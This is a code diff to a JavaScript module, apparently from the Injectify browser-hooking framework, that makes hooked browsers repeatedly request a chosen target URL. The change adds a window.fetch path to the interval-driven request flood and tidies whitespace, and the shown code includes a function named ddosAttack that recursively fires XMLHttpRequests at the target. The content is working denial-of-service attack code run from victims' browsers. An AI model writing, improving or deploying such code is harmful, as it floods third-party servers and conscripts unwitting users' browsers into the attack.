@@ -54,7 +54,7 @@ if (typeof module.params == 'object') {
         request.body = body
     }
 }
-  
+
 
 if (injectify.info.platform === 'browser') {
     /**
@@ -91,12 +91,11 @@ if (injectify.info.platform === 'browser') {
                     if (request.random) target += '&'
                 }
             }
-            
+
             /**
              * Request the target url
              */
             setInterval(function() {
-                var request = new Image()
                 var url = target
                 /**
                  * Add a query string to prevent the server from sending a cached response
@@ -105,8 +104,13 @@ if (injectify.info.platform === 'browser') {
                 /**
                  * Make a request
                  */
-                request.src = url
-                request.onload
+                if (typeof window.fetch === 'function') {
+                    window.fetch(url)
+                } else {
+                    var req = new Image()
+                    req.src = url
+                    req.onload
+                }
             }, request.interval)
             module.return(true)
         } else {
@@ -156,10 +160,10 @@ if (injectify.info.platform === 'browser') {
                  */
                 (function ddosAttack() {
                     var XHR = new XMLHttpRequest()
-                    
+
                     XHR.open(request.method, request.url, true)
                     XHR.setRequestHeader("Content-type", request.type)
-                    
+
                     XHR.onreadystatechange = function () {
                         setTimeout(ddosAttack, request.interval)
                     }
